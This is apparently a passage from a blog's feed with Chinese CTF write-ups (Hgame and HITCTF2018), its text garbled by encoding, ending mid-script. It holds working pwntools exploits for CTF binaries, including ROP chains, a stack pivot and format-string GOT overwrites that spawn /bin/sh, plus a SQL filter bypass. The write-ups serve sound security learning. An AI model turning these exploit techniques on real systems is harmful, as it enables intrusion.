class="number">0L</span>L;</span><br></pre></td></tr></table></figure><p>mainå‡½æ•°ä¸­å­˜åœ¨ä¸€ä¸ª0x10æ¯”ç‰¹çš„æ ˆæº¢å‡ºï¼Œå¯ä»¥è¦†ç›–rbpå’Œretï¼Œä¸å¤Ÿç»„ropï¼Œæœ¬é¢˜éœ€è¦ç”¨<strong>æ ˆè¿ç§»</strong>(<code>stack migrate</code>)</p><p>åˆ©ç”¨æ­¥éª¤:</p><ol><li>ä¼ªé€ rbpä¸ºbssåœ°å€ï¼Œç„¶åè·³å›<code>read(0, &amp;buf, 0x90uLL);</code>å¤„æ‰©å¤§è¾“å…¥ï¼Œå¯ä»¥å‘ç°ä¼šå†™å…¥bss-0x80å¤„ã€‚</li><li>ç¬¬ä¸€æ®µropæ˜¯æ³„éœ²putsåœ°å€è®¡ç®—libcåŸºå€ï¼Œå†™å…¥ç¬¬äºŒæ®µropåˆ°bss+0x100ï¼Œæœ€åè¿ç§»stackåˆ°è¿™é‡Œè¿›è¡Œgetshellã€‚å¡«å……æ»¡0x80åæº¢å‡ºè¦†ç›–ä¼ªé€ rbpä¸ºbss-0x80ï¼Œè¿ç§»stackåˆ°è¿™é‡Œæ‰§è¡Œç¬¬ä¸€æ®µropã€‚</li><li>æ„é€ ç¬¬äºŒæ®µropå†™åˆ°bss+0x100ï¼Œç„¶åè¿ç§»stackåˆ°bss+0x100æ‰§è¡Œropã€‚<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./ascii_art_maker'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ascii_art_maker'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span> )</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x0400A2B')</span></span><br><span class="line">p.recvuntil(<span class="string">'convert:\n'</span>)</span><br><span class="line"></span><br><span class="line">prdi = <span class="number">0x400a93</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">prsi = <span class="number">0x400a91</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">prbp = <span class="number">0x400640</span> <span class="comment"># pop rbp ; ret</span></span><br><span class="line">leave = <span class="number">0x400a2b</span></span><br><span class="line">read_addr = <span class="number">0x4009fc</span></span><br><span class="line">bss = <span class="number">0x602c00</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span> + p64(bss) + p64(read_addr) <span class="comment"># write rop1 to bss-0x80</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">rop = p64(<span class="number">0xdeadbeef</span>) + p64(prdi) + p64(elf.got[<span class="string">'puts'</span>]) + p64(elf.symbols[<span class="string">'puts'</span>]) <span class="comment"># leak puts</span></span><br><span class="line">rop += p64(prsi) + p64(bss+<span class="number">0x100</span>) + p64(bss+<span class="number">0x100</span>)+ p64(prdi) + p64(<span class="number">0</span>) + p64(elf.symbols[<span class="string">'read'</span>]) <span class="comment"># write rop2 to bss+0x100</span></span><br><span class="line">rop += p64(prbp) + p64(bss+<span class="number">0x100</span>) + p64(leave) <span class="comment">#ret to bss+0x100</span></span><br><span class="line">rop = rop.ljust(<span class="number">0x80</span>,<span class="string">'\x00'</span>) + p64(bss<span class="number">-0x80</span>) + p64(leave) <span class="comment">#ret to bss-0x80</span></span><br><span class="line">p.send(rop)</span><br><span class="line"></span><br><span class="line">addr_leak = p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]</span><br><span class="line">puts_addr = u64(addr_leak.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] puts : '</span>,hex(puts_addr)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system: '</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">rop = p64(<span class="number">0x602c00</span>)+ p64(prdi) +p64(next(libc.search(<span class="string">'/bin/sh'</span>))) + p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.send(rop)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h3 id="base64-decoder"><a href="#base64-decoder" class="headerlink" title="base64_decoder"></a>base64_decoder</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// [esp+8h] [ebp-110h]</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [esp+Ch] [ebp-10Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+10Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = <span class="number">2</span>;</span><br><span class="line">  sub_80485FB();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"===== online base64 decoder ====="</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(aBuyIt);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"this is the trial version, \x1B[0;31m%d\x1B[0m times left.\n"</span>, v1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%255s"</span>, &amp;s1);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"exit"</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( read_str(&amp;s1) )</span><br><span class="line">    &#123;</span><br><span class="line">      base64decode(&amp;s1);</span><br><span class="line">      <span class="built_in">printf</span>(&amp;s1);</span><br><span class="line">      --v1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ‰ä¸€ä¸ªå¾ˆæ˜¾ç¤ºçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œç¨‹åºåªèƒ½printfä¸¤æ¬¡ï¼Œå¯ä»¥æ³„éœ²stackåœ°å€ï¼Œä¿®æ”¹v1ç„¶åç”¨DynELFï¼Œæˆ–è€…æ³„éœ²å‡½æ•°åœ°å€ï¼Œç½‘ä¸Šæ‰¾libcã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ stack 20</span><br><span class="line">0000| 0xffe6ade0 --&gt; 0xffe6adfc (&quot;AAAA%p%p%p%p%p%p%p%p%p%p&quot;)</span><br><span class="line">0004| 0xffe6ade4 --&gt; 0x8048ad3 (&quot;exit&quot;)</span><br><span class="line">0008| 0xffe6ade8 --&gt; 0xffe6af08 --&gt; 0x0 </span><br><span class="line">0012| 0xffe6adec --&gt; 0x8048888 (sub    esp,0xc)</span><br><span class="line">0016| 0xffe6adf0 --&gt; 0xf7eff000 --&gt; 0x23f3c </span><br><span class="line">0020| 0xffe6adf4 --&gt; 0x8048320 (&quot;__libc_start_main&quot;)</span><br><span class="line">0024| 0xffe6adf8 --&gt; 0x2 </span><br><span class="line">0028| 0xffe6adfc (&quot;AAAA%p%p%p%p%p%p%p%p%p%p&quot;)</span><br><span class="line">gdb-peda$ distance 0xffe6af08 0xffe6adf8</span><br><span class="line">From 0xffe6af08 to 0xffe6adf8: -272 bytes, -68 dwords</span><br></pre></td></tr></table></figure></p><p>æŒ‰ç…§å®˜æ–¹æç¤ºç”¨DynELFåšï¼Œè„šæœ¬å¦‚ä¸‹ï¼šï¼ˆæ³¨æ„è¦†ç›–v1çš„æ—¶å€™ä¸è¦æº¢å‡ºäº†ï¼‰<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak stack</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,b64encode(<span class="string">'AAAA%2$pBBBB'</span>))</span><br><span class="line">p.recvuntil(<span class="string">'AAAA'</span>)</span><br><span class="line">stack_addr = int(p.recvuntil(<span class="string">'BBBB'</span>)[:<span class="number">-4</span>],<span class="number">16</span>)</span><br><span class="line">success(<span class="string">'stack_addr:%x'</span>,stack_addr)</span><br><span class="line"><span class="comment">#overwrite v1</span></span><br><span class="line">payload = p32(stack_addr<span class="number">-0x110</span>)+<span class="string">'%250c%7$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,b64encode(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">  payload = <span class="string">'AAAA%10$sBBB'</span> + p32(addr)</span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,b64encode(payload))</span><br><span class="line">  p.recvuntil(<span class="string">'AAAA'</span>)</span><br><span class="line">  info = p.recvuntil(<span class="string">'BBB'</span>)[:<span class="number">-3</span>]</span><br><span class="line">  <span class="keyword">if</span> info == <span class="string">''</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'\x00'</span></span><br><span class="line">  <span class="keyword">return</span> info</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">'./'</span>+target)</span><br><span class="line">d = DynELF(leak,elf=elf,libcdb=<span class="keyword">False</span>)</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line">success(<span class="string">'system_addr:%x'</span>,system_addr)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>,&#123;elf.got[<span class="string">'printf'</span>]:system_addr&#125;)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,b64encode(payload))</span><br><span class="line">p.sendline(b64encode(<span class="string">'/bin/sh\0'</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ç»ˆäºè¡¥å®Œäº†Hgameçš„pwnï¼Œå­¦åˆ°å¾ˆå¤šæ–°å§¿åŠ¿ã€‚&lt;/p&gt;
&lt;h3 id=&quot;guess-number&quot;&gt;&lt;a href=&quot;#guess-number&quot; class=&quot;headerlink&quot; title=&quot;guess_number&quot;&gt;&lt;/a&gt;guess_number&lt;/h3&gt;&lt;f
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HITCTF2018-writeup</title>
    <link href="https://4f-kira.github.io/2018/02/05/HITCTF2018-writeup/"/>
    <id>https://4f-kira.github.io/2018/02/05/HITCTF2018-writeup/</id>
    <published>2018-02-05T01:12:04.000Z</published>
    <updated>2018-04-12T08:37:46.011Z</updated>
    
    <content type="html"><![CDATA[<h3 id="easy-xor-apk"><a href="#easy-xor-apk" class="headerlink" title="easy_xor.apk"></a>easy_xor.apk</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">'kmqgwg]Tm3=NE_/4ouKJW@WE^'</span></span><br><span class="line">b=<span class="string">'#$%$#!&amp;#^_^~(:p@_*#######'</span></span><br><span class="line">c = [chr(ord(x)^ord(y)) <span class="keyword">for</span> x,y <span class="keyword">in</span> zip(a,b)]</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(c)</span><br></pre></td></tr></table></figure><p>ç®€å•xorå³å¯ï¼šHITCTF{w3lc0me_t0_hitctf}</p><h3 id="stackflow"><a href="#stackflow" class="headerlink" title="stackflow"></a>stackflow</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to pwn world!\nLeave your name:"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"bye~"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•æ ˆæº¢å‡ºåROPï¼Œç¨‹åºè‡ªå¸¦å¯ä»¥<code>cat flag</code>çš„å‡½æ•°ï¼Œå…¶å®ä¹Ÿå¯ä»¥ç”¨<code>system(&#39;/bin/sh\0&#39;)</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">flag</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">0xDEADBEEF</span> )</span><br><span class="line">    CheckFailed();</span><br><span class="line">  command = <span class="string">"cat flag"</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">0xC0FFEE</span> )</span><br><span class="line">    CheckFailed();</span><br><span class="line">  <span class="keyword">return</span> system(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æ³¨æ„<code>bss</code>ä¸­æœ‰<code>stdout</code>å‚æ•°ï¼Œä¸èƒ½ç›´æ¥å†™<code>bss+4</code>çš„ä½ç½®ï¼Œ<code>fflush(stdout)</code>ä¼šæŠ¥é”™<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>) </span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">target = <span class="string">'stackoverflow'</span>  </span><br><span class="line">remote_addr = <span class="string">'pwn.sniperoj.cn'</span></span><br><span class="line">remote_port = <span class="number">30006</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    p = process(<span class="string">'./'</span>+target)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(remote_addr,remote_port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./'</span>+target)</span><br><span class="line">offset= <span class="number">44</span></span><br><span class="line">read_addr = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">vuln_addr = elf.symbols[<span class="string">'vuln'</span>]</span><br><span class="line">sys = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">bss = <span class="number">0x804A04c</span>  <span class="comment">#bss+12</span></span><br><span class="line"><span class="comment">#payload = offset*'a' + p32(flag_addr) + p32(0) +p32(0xdeadbeef)+p32(0xc0ffee)</span></span><br><span class="line">payload = offset*<span class="string">'a'</span> + p32(read_addr) + p32(vuln_addr) +p32(<span class="number">0</span>)+p32(bss)+p32(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload=<span class="string">'/bin/sh\0'</span></span><br><span class="line">p.send(payload)</span><br><span class="line">payload = offset*<span class="string">'a'</span> + p32(sys) + p32(vuln_addr)+p32(bss)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="BaSO4"><a href="#BaSO4" class="headerlink" title="BaSO4"></a>BaSO4</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> file:</span><br><span class="line">    flag = file.read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">20</span>):</span><br><span class="line">    <span class="keyword">if</span> random.randint(<span class="number">0</span>, <span class="number">1</span>):</span><br><span class="line">        flag = base64.b64encode(flag)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    flag = base64.b32encode(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag_encode.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(flag)</span><br></pre></td></tr></table></figure><p>20æ¬¡éšæœºbase64æˆ–base32ç¼–ç ï¼Œæ‰‹å·¥ä¸€ä¸‹å°±è¡Œäº†</p><h3 id="å•è¡¨æ›¿æ¢"><a href="#å•è¡¨æ›¿æ¢" class="headerlink" title="å•è¡¨æ›¿æ¢"></a>å•è¡¨æ›¿æ¢</h3><p>æ‰‹å·¥æ›¿æ¢å³å¯ï¼Œæ³¨æ„ä¿„æ–‡ä¹Ÿæœ‰åˆ†å¤§å°å†™çš„ï¼ŒåŸæ–‡æ˜¯Gone with the wind</p><h3 id="BabyInjection"><a href="#BabyInjection" class="headerlink" title="BabyInjection"></a>BabyInjection</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)|like|rlike|regexp|limit|or"</span>;</span><br><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$passwd = $_POST[<span class="string">'passwd'</span>];</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$filter.<span class="string">"/is"</span>,$username)==<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Hacker hacker hacker~"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$query = <span class="string">"SELECT * FROM users WHERE username='&#123;$username&#125;';"</span>;</span><br><span class="line">$query = mysqli_query($conn, $query);</span><br><span class="line"><span class="keyword">if</span> (mysqli_num_rows($query) == <span class="number">1</span>)&#123;</span><br><span class="line">    $result = mysqli_fetch_array($query);</span><br><span class="line">    <span class="keyword">if</span> ($result[<span class="string">'passwd'</span>] == $passwd)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'you did it and this is your flag: '</span>.$flag);</span><br></pre></td></tr></table></figure><p>å¼±ç±»å‹ç»•è¿‡<code>passwd</code>çš„åˆ¤æ–­ï¼Œç”¨<code>with rollup</code>ï¼›ç”±äºè¿‡æ»¤äº†<code>limit</code>ï¼Œå¯ä»¥ç”¨<code>having passwd is null</code>è§£å†³ã€‚</p><h3 id="å­¦ä¹ èµ„æ–™çš„å¯†ç "><a href="#å­¦ä¹ èµ„æ–™çš„å¯†ç " class="headerlink" title="å­¦ä¹ èµ„æ–™çš„å¯†ç "></a>å­¦ä¹ èµ„æ–™çš„å¯†ç </h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"Give me your key:"</span>);</span><br><span class="line">v7 = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(<span class="number">1u</span>, <span class="number">0x32</span>u);</span><br><span class="line">myRead(v7);</span><br><span class="line">v6 = basen(v7);</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v6, &amp;v4) )</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You've got my base :)"</span>);</span><br></pre></td></tr></table></figure><p>é¢˜ç›®æä¾›äº†åŠ å¯†åçš„flagï¼Œç¨‹åºå¯¹è¾“å…¥è¿›è¡Œè¿ç®—åä¸åŠ å¯†å†…å®¹æ¯”è¾ƒï¼Œçœ‹çœ‹åŠ å¯†ç®—æ³•<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v19 - v19 % <span class="number">3</span>; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = v22;</span><br><span class="line">    v2 = v22 + <span class="number">1</span>;</span><br><span class="line">    v20[v1] = chart[(a1[i] &gt;&gt; <span class="number">5</span>) &amp; <span class="number">7</span>];</span><br><span class="line">    v3 = v2++;</span><br><span class="line">    v20[v3] = chart[(a1[i] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">7</span>];</span><br><span class="line">    v4 = v2++;</span><br><span class="line">    v20[v4] = chart[<span class="number">2</span> * a1[i] &amp; <span class="number">6</span> | (a1[i + <span class="number">1</span>] &gt;&gt; <span class="number">7</span>) &amp; <span class="number">1</span>];</span><br><span class="line">    v5 = v2++;</span><br><span class="line">    v20[v5] = chart[(a1[i + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">7</span>];</span><br><span class="line">    v6 = v2++;</span><br><span class="line">    v20[v6] = chart[(a1[i + <span class="number">1</span>] &gt;&gt; <span class="number">1</span>) &amp; <span class="number">7</span>];</span><br><span class="line">    v7 = v2++;</span><br><span class="line">    v20[v7] = chart[<span class="number">4</span> * a1[i + <span class="number">1</span>] &amp; <span class="number">4</span> | (a1[i + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>) &amp; <span class="number">3</span>];</span><br><span class="line">    v20[v2] = chart[(a1[i + <span class="number">2</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">7</span>];</span><br><span class="line">    v8 = v2 + <span class="number">1</span>;</span><br><span class="line">    v22 = v2 + <span class="number">2</span>;</span><br><span class="line">    v20[v8] = chart[a1[i + <span class="number">2</span>] &amp; <span class="number">7</span>];</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>é‡ç‚¹åœ¨è¿™æ®µä»£ç ï¼Œç®—æ³•æ˜¯å°†3ä¸ºæ˜æ–‡è½¬æ¢æˆ8ä½ï¼Œå¤šå‡ºæ¥çš„ä½è¿ç®—åé¢è¿˜æœ‰ï¼Œä½†ä¸é‡è¦ã€‚å¯†æ–‡æ˜¯67ä½ï¼Œ67%8=3ï¼Œé‡ç‚¹è§£å†³å‰é¢22ä½OKäº†ã€‚ç®—æ³•ä¸éš¾ï¼Œå¯ä»¥ç›´æ¥è¿›è¡Œæ¯3ä½çˆ†ç ´ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">a1 = <span class="string">'llW00ml0lWeml3Weceec3m03c0e!0mc!cW0cl3ecc3lm!0eccllecmmWcmWcmWm3c!l'</span></span><br><span class="line">chart = <span class="string">'W3lc0me!'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(s)</span>:</span></span><br><span class="line">    tmp = <span class="string">''</span></span><br><span class="line">    tmp += chart[(ord(s[<span class="number">0</span>])&gt;&gt;<span class="number">5</span>)&amp;<span class="number">7</span>]</span><br><span class="line">    tmp += chart[(ord(s[<span class="number">0</span>])&gt;&gt;<span class="number">2</span>)&amp;<span class="number">7</span>]</span><br><span class="line">    tmp += chart[<span class="number">2</span> * ord(s[<span class="number">0</span>]) &amp; <span class="number">6</span> | (ord(s[<span class="number">1</span>]) &gt;&gt; <span class="number">7</span>) &amp; <span class="number">1</span>]</span><br><span class="line">    tmp += chart[(ord(s[<span class="number">1</span>]) &gt;&gt; <span 